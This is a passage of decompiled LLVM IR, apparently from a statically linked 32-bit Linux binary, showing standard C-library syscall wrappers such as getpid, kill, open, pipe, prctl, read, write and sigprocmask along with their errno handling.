  uselistorder i32 -13, { 1, 0 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8050e22, { 4, 2, 3, 0, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8050e2f = ptrtoint i32* %stack_var_-8 to i32
  %v2_8050e36 = call i32 @getrlimit(i32 7, i32 %v2_8050e2f)
  store i32 256, i32* @edx, align 4
  %v2_8050e43 = icmp slt i32 %v2_8050e36, 0
  br i1 %v2_8050e43, label %dec_label_pc_8050e4b, label %dec_label_pc_8050e47

dec_label_pc_8050e47:                             ; preds = %entry
  %v3_8050e47 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8050e47, i32* @edx, align 4
  br label %dec_label_pc_8050e4b

dec_label_pc_8050e4b:                             ; preds = %entry, %dec_label_pc_8050e47
  %v0_8050e4b = phi i32 [ 256, %entry ], [ %v3_8050e47, %dec_label_pc_8050e47 ]
  ret i32 %v0_8050e4b

; uselistorder directives
  uselistorder label %dec_label_pc_8050e4b, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8050e54 = load i32, i32* @global_var_8061790.457, align 16
  store i32 %v0_8050e54, i32* @edx, align 4
  %v1_8050e5f = icmp eq i32 %v0_8050e54, 0
  %v1_8050e61 = icmp eq i1 %v1_8050e5f, false
  %v4_8050e61 = select i1 %v1_8050e61, i32 %v0_8050e54, i32 4096
  ret i32 %v4_8050e61
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050e68 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e68, i32* %stack_var_-4, align 4
  %v1_8050e71 = call i32 @getpid(i32 %v0_8050e68)
  store i32 %v1_8050e71, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050e71, -4095
  br i1 %tmp, label %dec_label_pc_8050e88, label %dec_label_pc_8050e7c

dec_label_pc_8050e7c:                             ; preds = %entry
  %v0_8050e7c = load i32, i32* %stack_var_-4, align 4
  %v1_8050e7c = call i32 @__errno_location(i32 %v0_8050e7c)
  %v0_8050e81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050e81 = sub i32 0, %v0_8050e81
  %v2_8050e83 = inttoptr i32 %v1_8050e7c to i32*
  store i32 %v1_8050e81, i32* %v2_8050e83, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e88

dec_label_pc_8050e88:                             ; preds = %entry, %dec_label_pc_8050e7c
  %v0_8050e89 = phi i32 [ %v1_8050e71, %entry ], [ -1, %dec_label_pc_8050e7c ]
  %v2_8050e8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050e8c, i32* @ebx, align 4
  ret i32 %v0_8050e89

; uselistorder directives
  uselistorder i32 %v1_8050e71, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050e88, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050e90 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e90, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8050ea3 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8050ea3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050ea3, -4095
  br i1 %tmp, label %dec_label_pc_8050ebc, label %dec_label_pc_8050eb0

dec_label_pc_8050eb0:                             ; preds = %entry
  %v0_8050eb0 = load i32, i32* %stack_var_-4, align 4
  %v1_8050eb0 = call i32 @__errno_location(i32 %v0_8050eb0)
  %v0_8050eb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050eb5 = sub i32 0, %v0_8050eb5
  %v2_8050eb7 = inttoptr i32 %v1_8050eb0 to i32*
  store i32 %v1_8050eb5, i32* %v2_8050eb7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050ebc

dec_label_pc_8050ebc:                             ; preds = %entry, %dec_label_pc_8050eb0
  %v0_8050ebd = phi i32 [ %v1_8050ea3, %entry ], [ -1, %dec_label_pc_8050eb0 ]
  %v2_8050ec0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050ec0, i32* @ebx, align 4
  ret i32 %v0_8050ebd

; uselistorder directives
  uselistorder i32 %v1_8050ea3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ebc, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050ec4 = load i32, i32* @edi, align 4
  store i32 %v0_8050ec4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050edc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050ee4 = call i32 @ioctl(i32 %v0_8050edc, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8050edc, i32* @ebx, align 4
  store i32 %v3_8050ee4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8050ee4, -4095
  br i1 %tmp, label %dec_label_pc_8050efc, label %dec_label_pc_8050ef0

dec_label_pc_8050ef0:                             ; preds = %entry
  %v1_8050ef0 = call i32 @__errno_location(i32 %v0_8050edc)
  %v0_8050ef5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050ef5 = sub i32 0, %v0_8050ef5
  %v2_8050ef7 = inttoptr i32 %v1_8050ef0 to i32*
  store i32 %v1_8050ef5, i32* %v2_8050ef7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050efc

dec_label_pc_8050efc:                             ; preds = %entry, %dec_label_pc_8050ef0
  %v0_8050eff = phi i32 [ %v3_8050ee4, %entry ], [ -1, %dec_label_pc_8050ef0 ]
  %v2_8050f01 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050f01, i32* @edi, align 4
  ret i32 %v0_8050eff

; uselistorder directives
  uselistorder i32 %v3_8050ee4, { 1, 0, 2 }
  uselistorder i32 %v0_8050edc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050efc, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f04 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f04, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8050f17 = call i32 @kill(i32 %v0_8050f04, i32 %tmp4)
  store i32 %v2_8050f17, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050f17, -4095
  br i1 %tmp, label %dec_label_pc_8050f30, label %dec_label_pc_8050f24

dec_label_pc_8050f24:                             ; preds = %entry
  %v0_8050f24 = load i32, i32* %stack_var_-4, align 4
  %v1_8050f24 = call i32 @__errno_location(i32 %v0_8050f24)
  %v0_8050f29 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050f29 = sub i32 0, %v0_8050f29
  %v2_8050f2b = inttoptr i32 %v1_8050f24 to i32*
  store i32 %v1_8050f29, i32* %v2_8050f2b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050f30

dec_label_pc_8050f30:                             ; preds = %entry, %dec_label_pc_8050f24
  %v0_8050f31 = phi i32 [ %v2_8050f17, %entry ], [ -1, %dec_label_pc_8050f24 ]
  %v2_8050f30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050f30, i32* @edx, align 4
  %v2_8050f34 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050f34, i32* @ebx, align 4
  ret i32 %v0_8050f31

; uselistorder directives
  uselistorder i32 %v2_8050f17, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050f30, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8050f3b = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8050f3f = sdiv i32 %sext, 16777216
  store i32 %v4_8050f3f, i32* @ecx, align 4
  %v4_8050f43 = ptrtoint i8* %arg1 to i32
  %v3_8050f47 = and i32 %arg2, 64
  %v4_8050f47 = icmp eq i32 %v3_8050f47, 0
  br i1 %v4_8050f47, label %dec_label_pc_8050f58, label %dec_label_pc_8050f4c

dec_label_pc_8050f4c:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8050f58

dec_label_pc_8050f58:                             ; preds = %entry, %dec_label_pc_8050f4c
  %v0_8050f58 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_8050f4c ]
  store i32 %v0_8050f58, i32* @edx, align 4
  store i32 %v4_8050f43, i32* %ebx.global-to-local, align 4
  %v5_8050f63 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8050f3f)
  store i32 %v5_8050f63, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_8050f63, -4095
  br i1 %tmp15, label %dec_label_pc_8050f7b, label %dec_label_pc_8050f6f

dec_label_pc_8050f6f:                             ; preds = %dec_label_pc_8050f58
  %v1_8050f6f = call i32 @__errno_location(i32 %v0_8050f3b)
  %v0_8050f74 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050f74 = sub i32 0, %v0_8050f74
  %v2_8050f76 = inttoptr i32 %v1_8050f6f to i32*
  store i32 %v1_8050f74, i32* %v2_8050f76, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050f7b

dec_label_pc_8050f7b:                             ; preds = %dec_label_pc_8050f58, %dec_label_pc_8050f6f
  %v0_8050f7e = phi i32 [ %v5_8050f63, %dec_label_pc_8050f58 ], [ -1, %dec_label_pc_8050f6f ]
  store i32 %v0_8050f3b, i32* @ebx, align 4
  ret i32 %v0_8050f7e

; uselistorder directives
  uselistorder i32 %v5_8050f63, { 1, 0, 2 }
  uselistorder i32 %v4_8050f3f, { 1, 0 }
  uselistorder i32 %v0_8050f3b, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050f7b, { 1, 0 }
  uselistorder label %dec_label_pc_8050f58, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8050f93 = inttoptr i32 %arg1 to i8*
  %v4_8050f93 = call i32 @__libc_open(i8* %v3_8050f93, i32 577)
  ret i32 %v4_8050f93
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f9c = load i32, i32* @edi, align 4
  store i32 %v0_8050f9c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050fa4 = load i32, i32* @ebx, align 4
  %v1_8050fac = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8050fac = call i32 @pipe([2 x i32] %v1_8050fac)
  store i32 %v0_8050fa4, i32* @ebx, align 4
  store i32 %v2_8050fac, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050fac, -4095
  br i1 %tmp, label %dec_label_pc_8050fc4, label %dec_label_pc_8050fb8

dec_label_pc_8050fb8:                             ; preds = %entry
  %v1_8050fb8 = call i32 @__errno_location(i32 %v0_8050fa4)
  %v0_8050fbd = load i32, i32* %edi.global-to-local, align 4
  %v1_8050fbd = sub i32 0, %v0_8050fbd
  %v2_8050fbf = inttoptr i32 %v1_8050fb8 to i32*
  store i32 %v1_8050fbd, i32* %v2_8050fbf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050fc4

dec_label_pc_8050fc4:                             ; preds = %entry, %dec_label_pc_8050fb8
  %v0_8050fc5 = phi i32 [ %v2_8050fac, %entry ], [ -1, %dec_label_pc_8050fb8 ]
  %v2_8050fc8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050fc8, i32* @edi, align 4
  ret i32 %v0_8050fc5

; uselistorder directives
  uselistorder i32 %v2_8050fac, { 1, 0, 2 }
  uselistorder i32 %v0_8050fa4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050fc4, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050fcc = load i32, i32* @edi, align 4
  %v0_8050fcd = load i32, i32* @esi, align 4
  store i32 %v0_8050fcd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8050fe5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_8050fed = call i32 @prctl(i32 %v0_8050fe5, i32 %v0_8050fcd, i32 %v0_8050fcc, i32 %tmp6, i32 %arg1)
  store i32 %v0_8050fe5, i32* @ebx, align 4
  store i32 %v5_8050fed, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_8050fed, -4095
  br i1 %tmp, label %dec_label_pc_8051005, label %dec_label_pc_8050ff9

dec_label_pc_8050ff9:                             ; preds = %entry
  %v1_8050ff9 = call i32 @__errno_location(i32 %v0_8050fe5)
  %v0_8050ffe = load i32, i32* %esi.global-to-local, align 4
  %v1_8050ffe = sub i32 0, %v0_8050ffe
  %v2_8051000 = inttoptr i32 %v1_8050ff9 to i32*
  store i32 %v1_8050ffe, i32* %v2_8051000, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051005

dec_label_pc_8051005:                             ; preds = %entry, %dec_label_pc_8050ff9
  %v0_8051006 = phi i32 [ %v5_8050fed, %entry ], [ -1, %dec_label_pc_8050ff9 ]
  %v2_8051008 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051008, i32* @esi, align 4
  store i32 %v0_8050fcc, i32* @edi, align 4
  ret i32 %v0_8051006

; uselistorder directives
  uselistorder i32 %v5_8050fed, { 1, 0, 2 }
  uselistorder i32 %v0_8050fe5, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051005, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805100c = load i32, i32* @edi, align 4
  store i32 %v0_805100c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805101c = load i32, i32* @ebx, align 4
  %v4_8051024 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805101c, i32* @ebx, align 4
  store i32 %v4_8051024, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051024, -4095
  br i1 %tmp, label %dec_label_pc_805103c, label %dec_label_pc_8051030

dec_label_pc_8051030:                             ; preds = %entry
  %v1_8051030 = call i32 @__errno_location(i32 %v0_805101c)
  %v0_8051035 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051035 = sub i32 0, %v0_8051035
  %v2_8051037 = inttoptr i32 %v1_8051030 to i32*
  store i32 %v1_8051035, i32* %v2_8051037, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805103c

dec_label_pc_805103c:                             ; preds = %entry, %dec_label_pc_8051030
  %v0_805103d = phi i32 [ %v4_8051024, %entry ], [ -1, %dec_label_pc_8051030 ]
  %v2_8051040 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051040, i32* @edi, align 4
  ret i32 %v0_805103d

; uselistorder directives
  uselistorder i32 %v4_8051024, { 1, 0, 2 }
  uselistorder i32 %v0_805101c, { 1, 0 }
  uselistorder label %dec_label_pc_805103c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051045 = load i32, i32* @esi, align 4
  store i32 %v0_8051045, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805105d = load i32, i32* @ebx, align 4
  %v1_8051065 = call i32 @int80_syscall(i32 142)
  store i32 %v0_805105d, i32* @ebx, align 4
  store i32 %v1_8051065, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051065, -4095
  br i1 %tmp, label %dec_label_pc_805107d, label %dec_label_pc_8051071

dec_label_pc_8051071:                             ; preds = %entry
  %v1_8051071 = call i32 @__errno_location(i32 %v0_805105d)
  %v0_8051076 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051076 = sub i32 0, %v0_8051076
  %v2_8051078 = inttoptr i32 %v1_8051071 to i32*
  store i32 %v1_8051076, i32* %v2_8051078, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805107d

dec_label_pc_805107d:                             ; preds = %entry, %dec_label_pc_8051071
  %v0_805107e = phi i32 [ %v1_8051065, %entry ], [ -1, %dec_label_pc_8051071 ]
  %v2_805107d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805107d, i32* @edx, align 4
  %v2_8051080 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051080, i32* @esi, align 4
  ret i32 %v0_805107e

; uselistorder directives
  uselistorder i32 %v1_8051065, { 1, 0, 2 }
  uselistorder i32 %v0_805105d, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_805107d, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051084 = load i32, i32* @ebx, align 4
  store i32 %v0_8051084, i32* %stack_var_-4, align 4
  %v1_805108d = call i32 @setsid(i32 %v0_8051084)
  store i32 %v1_805108d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805108d, -4095
  br i1 %tmp, label %dec_label_pc_80510a4, label %dec_label_pc_8051098

dec_label_pc_8051098:                             ; preds = %entry
  %v0_8051098 = load i32, i32* %stack_var_-4, align 4
  %v1_8051098 = call i32 @__errno_location(i32 %v0_8051098)
  %v0_805109d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805109d = sub i32 0, %v0_805109d
  %v2_805109f = inttoptr i32 %v1_8051098 to i32*
  store i32 %v1_805109d, i32* %v2_805109f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80510a4

dec_label_pc_80510a4:                             ; preds = %entry, %dec_label_pc_8051098
  %v0_80510a5 = phi i32 [ %v1_805108d, %entry ], [ -1, %dec_label_pc_8051098 ]
  %v2_80510a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80510a8, i32* @ebx, align 4
  ret i32 %v0_80510a5

; uselistorder directives
  uselistorder i32 %v1_805108d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80510a4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_80510ad = load i32, i32* @esi, align 4
  %v4_80510b1 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_80510b1, i32* @ecx, align 4
  %v2_80510bd = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_80510bd, label %dec_label_pc_80510d6, label %dec_label_pc_80510c1

dec_label_pc_80510c1:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_80510d6, label %dec_label_pc_80510c6

dec_label_pc_80510c6:                             ; preds = %dec_label_pc_80510c1
  %v1_80510c6 = call i32 @__errno_location(i32 %v0_80510ad)
  %v1_80510cb = inttoptr i32 %v1_80510c6 to i32*
  store i32 22, i32* %v1_80510cb, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_80510fd

dec_label_pc_80510d6:                             ; preds = %dec_label_pc_80510c1, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80510db = load i32, i32* @ebx, align 4
  %v7_80510e3 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_80510db, i32* @ebx, align 4
  %v1_80510e6 = add i32 %v7_80510e3, 4096
  %v2_80510e6 = icmp ult i32 %v7_80510e3, -4096
  %v3_80510e6 = xor i32 %v7_80510e3, -2147483648
  %v4_80510e6 = xor i32 %v1_80510e6, %v7_80510e3
  %v5_80510e6 = and i32 %v4_80510e6, %v3_80510e6
  %v6_80510e6 = icmp slt i32 %v5_80510e6, 0
  store i1 %v6_80510e6, i1* @of, align 1
  %v7_80510e6 = icmp eq i32 %v1_80510e6, 0
  store i32 %v7_80510e3, i32* %esi.global-to-local, align 4
  %v2_80510ed = or i1 %v2_80510e6, %v7_80510e6
  br i1 %v2_80510ed, label %dec_label_pc_80510fd, label %dec_label_pc_80510ef

dec_label_pc_80510ef:                             ; preds = %dec_label_pc_80510d6
  %v1_80510ef = call i32 @__errno_location(i32 %v0_80510db)
  %v0_80510f4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80510f4 = sub i32 0, %v0_80510f4
  %v2_80510f6 = inttoptr i32 %v1_80510ef to i32*
  store i32 %v1_80510f4, i32* %v2_80510f6, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80510fd

dec_label_pc_80510fd:                             ; preds = %dec_label_pc_80510ef, %dec_label_pc_80510d6, %dec_label_pc_80510c6
  %storemerge = phi i32 [ -1, %dec_label_pc_80510c6 ], [ %v7_80510e3, %dec_label_pc_80510d6 ], [ -1, %dec_label_pc_80510ef ]
  %v2_80510fd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80510fd, i32* @edx, align 4
  store i32 %v0_80510ad, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80510e6, { 1, 0 }
  uselistorder i32 %v7_80510e3, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_80510db, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051104 = load i32, i32* @edi, align 4
  store i32 %v0_8051104, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805110c = load i32, i32* @ebx, align 4
  %v2_8051114 = call i32 @time(i32* %arg1)
  store i32 %v0_805110c, i32* @ebx, align 4
  store i32 %v2_8051114, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051114, -4095
  br i1 %tmp, label %dec_label_pc_805112c, label %dec_label_pc_8051120

dec_label_pc_8051120:                             ; preds = %entry
  %v1_8051120 = call i32 @__errno_location(i32 %v0_805110c)
  %v0_8051125 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051125 = sub i32 0, %v0_8051125
  %v2_8051127 = inttoptr i32 %v1_8051120 to i32*
  store i32 %v1_8051125, i32* %v2_8051127, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805112c

dec_label_pc_805112c:                             ; preds = %entry, %dec_label_pc_8051120
  %v0_805112d = phi i32 [ %v2_8051114, %entry ], [ -1, %dec_label_pc_8051120 ]
  %v2_805112c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805112c, i32* @edx, align 4
  %v2_8051130 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051130, i32* @edi, align 4
  ret i32 %v0_805112d

; uselistorder directives
  uselistorder i32 %v2_8051114, { 1, 0, 2 }
  uselistorder i32 %v0_805110c, { 1, 0 }
  uselistorder label %dec_label_pc_805112c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8051145 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8051145
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051150 = load i32, i32* @edi, align 4
  store i32 %v0_8051150, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051160 = load i32, i32* @ebx, align 4
  %v4_8051168 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8051160, i32* @ebx, align 4
  store i32 %v4_8051168, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051168, -4095
  br i1 %tmp, label %dec_label_pc_8051180, label %dec_label_pc_8051174

dec_label_pc_8051174:                             ; preds = %entry
  %v1_8051174 = call i32 @__errno_location(i32 %v0_8051160)
  %v0_8051179 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051179 = sub i32 0, %v0_8051179
  %v2_805117b = inttoptr i32 %v1_8051174 to i32*
  store i32 %v1_8051179, i32* %v2_805117b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051180

dec_label_pc_8051180:                             ; preds = %entry, %dec_label_pc_8051174
  %v0_8051181 = phi i32 [ %v4_8051168, %entry ], [ -1, %dec_label_pc_8051174 ]
  %v2_8051180 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051180, i32* @edx, align 4
  %v2_8051184 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051184, i32* @edi, align 4
  ret i32 %v0_8051181

; uselistorder directives
  uselistorder i32 %v4_8051168, { 1, 0, 2 }
  uselistorder i32 %v0_8051160, { 1, 0 }
  uselistorder label %dec_label_pc_8051180, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805118c = load i32, i32* inttoptr (i32 134591128 to i32*), align 8
  %v2_8051191 = mul i32 %arg1, 2
  %v3_8051191 = add i32 %v0_805118c, %v2_8051191
  %v4_8051191 = inttoptr i32 %v3_8051191 to i16*
  %v5_8051191 = load i16, i16* %v4_8051191, align 2
  %v6_8051191 = zext i16 %v5_8051191 to i32
  %v1_8051195 = and i32 %v6_8051191, 32
  ret i32 %v1_8051195
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80511a0 = add i32 %arg1, 128
  %v6_80511ab = icmp ugt i32 %v1_80511a0, 383
  br i1 %v6_80511ab, label %dec_label_pc_80511b6, label %dec_label_pc_80511ad

dec_label_pc_80511ad:                             ; preds = %entry
  %v0_80511ad = load i32, i32* inttoptr (i32 134591136 to i32*), align 32
  %v2_80511b2 = mul i32 %arg1, 2
  %v3_80511b2 = add i32 %v0_80511ad, %v2_80511b2
  %v4_80511b2 = inttoptr i32 %v3_80511b2 to i16*
  %v5_80511b2 = load i16, i16* %v4_80511b2, align 2
  %v6_80511b2 = sext i16 %v5_80511b2 to i32
  store i32 %v6_80511b2, i32* @edx, align 4
  br label %dec_label_pc_80511b6

dec_label_pc_80511b6:                             ; preds = %entry, %dec_label_pc_80511ad
  %v0_80511b6 = phi i32 [ %arg1, %entry ], [ %v6_80511b2, %dec_label_pc_80511ad ]
  ret i32 %v0_80511b6

; uselistorder directives
  uselistorder label %dec_label_pc_80511b6, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80617a0.463 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80511c4 = load i32, i32* @ebp, align 4
  %v0_80511c5 = load i32, i32* @edi, align 4
  %v0_80511c6 = load i32, i32* @esi, align 4
  %v0_80511c7 = load i32, i32* @ebx, align 4
  %v4_80511cb = ptrtoint i16* %arg1 to i32
  store i32 %v4_80511cb, i32* @esi, align 4
